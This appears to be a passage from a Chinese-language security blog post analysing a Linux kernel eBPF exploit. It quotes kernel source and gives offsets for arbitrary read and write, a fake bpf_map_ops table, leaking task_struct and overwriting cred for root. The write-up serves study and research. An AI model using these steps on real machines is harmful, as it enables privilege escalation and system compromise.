<pre><code class="c">// /kernel/bpf/queue_stack_maps.c#L272         BPF_MAP_TYPE_STACK
const struct bpf_map_ops stack_map_ops = &#123;
    .map_alloc_check = queue_stack_map_alloc_check,
    .map_alloc = queue_stack_map_alloc,
    .map_free = queue_stack_map_free,
    .map_lookup_elem = queue_stack_map_lookup_elem,
    .map_update_elem = queue_stack_map_update_elem,
    .map_delete_elem = queue_stack_map_delete_elem,
    .map_push_elem = queue_stack_map_push_elem,   // map_push_elem 伪造成 map_get_next_key 
    .map_pop_elem = stack_map_pop_elem,
    .map_peek_elem = stack_map_peek_elem,
    .map_get_next_key = queue_stack_map_get_next_key,    // map_get_next_key
&#125;;</code></pre>
<p>调用<code>bpf_update_elem</code>任意写内存，<code>bpf_update_elem</code>-&gt;<code>map_update_elem(mapfd, &amp;key, &amp;value, flags) </code>-&gt; <code>map_push_elem</code>(被填充成 map_get_next_key) -&gt;<code>array_map_get_next_key</code>.</p>
<p><code>map_push_elem()</code> 的参数是 value 和 flags，分别对应<code>array_map_get_next_key()</code>的 key 和 next_key 参数，这里有一个32位的赋值操作<code> (u32 *)next_key = *(u32 *)key +1</code>， 因此可以构造 *flags = value[0]+1，这里index 和 next 都是 u32 类型， 所以可以任意地址写 4个byte。</p>
<pre><code class="c">// .map_push_elem = queue_stack_map_push_elem
static int queue_stack_map_push_elem(struct bpf_map *map, void *value, u64 flags)
// .map_get_next_key = queue_stack_map_get_next_key
static int array_map_get_next_key(struct bpf_map *map, void *key, void *next_key) &#123;
  struct bpf_array *array = container_of(map, struct bpf_array, map);
  u32 index = key ? *(u32 *)key : U32_MAX;
  u32 *next = (u32 *)next_key;
 ...
   *next = index + 1; 
...</code></pre>
<div style="page-break-after: always; break-after: page;"></div>

<h4 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h4><p>利用<code>BPF_OBJ_GET_INFO_BY_FD</code>选项进行任意读。通过修改map-&gt;btf 指针为target_addr-0x58，读取map-&gt;btf+0x58处的32 bit值（map-&gt;btf.id）</p>
<p>调用流：BPF_OBJ_GET_INFO_BY_FD -&gt; bpf_obj_get_info_by_fd() -&gt; bpf_map_get_info_by_fd()</p>
<pre><code class="c">// bpf_map_get_info_by_fd()
static int bpf_map_get_info_by_fd(struct bpf_map *map,
                  const union bpf_attr *attr,
                  union bpf_attr __user *uattr)
&#123;
    struct bpf_map_info __user *uinfo = u64_to_user_ptr(attr-&gt;info.info);
    struct bpf_map_info info = &#123;&#125;;   
    u32 info_len = attr-&gt;info.info_len;
    ......
        if (map-&gt;btf) &#123;
            info.btf_id = btf_id(map-&gt;btf); &lt;---- fake map-&gt;btf 
            info.btf_key_type_id = map-&gt;btf_key_type_id;
            info.btf_value_type_id = map-&gt;btf_value_type_id;
        &#125;
    ......
        if (copy_to_user(uinfo, &amp;info, info_len) ||  &lt;----leak info
            put_user(info_len, &amp;uattr-&gt;info.info_len))
            return -EFAULT;

    return 0;
&#125;</code></pre>
<p>所以只需要修改 map-&gt;btf 为 target_addr-0x58，就可以把btf-&gt;id（target_addr处的值）泄露到用户态info中，泄漏的信息在struct bpf_map_info 结构偏移0x40处，由于是u32类型，所以一次只能泄露4个字节。</p>
<div style="page-break-after: always; break-after: page;"></div>

<h4 id="漏洞利用总结"><a href="#漏洞利用总结" class="headerlink" title="漏洞利用总结"></a>漏洞利用总结</h4><ul>
<li>创建eBPF代码，载入内核，通过verifier检查；</li>
<li>泄露内核基址：读取<code>bpf_array-&gt;map-&gt;ops</code>指针，位于 <code>&amp;value[0]-0x110</code> (eBPF程序中可以获取<code>&amp;value[0]</code>，再减去0x110即可)，用户层调用<code>bpf_lookup_elem()</code>读取map数据。</li>
<li><code>&amp;value[0]+0x80+0x70</code>处伪造 <code>bpf_array-&gt;map-&gt;ops-&gt;map_push_elem</code>：先任意读泄露<code>bpf_array-&gt;map-&gt;ops-&gt;map_get_next_key</code>，然后在<code>&amp;value[0]+0x80</code>处伪造<code>bpf_array-&gt;map-&gt;ops</code>函数表，将<code>map_push_elem</code>替换为<code>map_get_next_key</code>，便于之后构造任意写；</li>
<li>泄露<code>&amp;value[0]</code>：便于在<code>value[]</code>上伪造假的<code>bpf_array-&gt;map-&gt;ops</code>函数表；读取value[0]的地址，由于 <code>bpf_array-&gt;waitlist</code> (偏移0xc0)指向自身，所以 <code>&amp;value[0]= &amp;bpf_array-&gt;waitlist + 0x50</code>，只需读取 <code>&amp;value[0]-0x110+0xc0</code> 的值，加上0x50即可，读出来的地址存放在<code>value[4]</code>。</li>
<li>泄露<code>task_struct</code>地址：任意地址读，篡改 <code>bpf_array-&gt;map-&gt;btf</code> (偏移0x40)，利用 <code>bpf_map_get_info_by_fd</code> 泄露 <code>map-&gt;btf+0x58</code> 地址处的4字节（将<code>map-&gt;btf</code>篡改为<code>target_addr-0x58</code>即可）；首个<code>task_struct</code>地址存放在<code>init_pid_ns</code>。</li>
<li>找到本线程的cred地址：遍历 <code>task_struct-&gt;tasks-&gt;next</code> 链表，读取指定线程的cred地址。</li>
<li>修改cred，任意地址写：篡改 <code>bpf_array-&gt;map-&gt;ops</code> 函数表指针，指向<code>&amp;value[0]+0x80</code>处伪造的<code>bpf_map_ops</code>函数表，将<code>map_push_elem</code>改为<code>map_get_next_key</code>，这样调用<code>map_push_elem</code>时实际会调用<code>map_get_next_key</code> ，能够任意写4字节（用户层调用<code>bpf_update_elem()</code>）；还需要构造 map 的3个字段绕过某些检查。</li>
</ul>
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><em></em><a class="button is-default" href="/awd-pwn-checker/" title="awd pwn checker编写记录"><span class="has-text-weight-semibold">Next: awd pwn checker编写记录</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="Q1IQ" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com/Q1iqF"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Q1IQ"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><a title="rss" target="_blank" rel="noopener nofollow" href="/atom.xml"><i class="iconfont icon-rss"></i></a><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Q1IQ 2022</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/post.js"></script></body></html>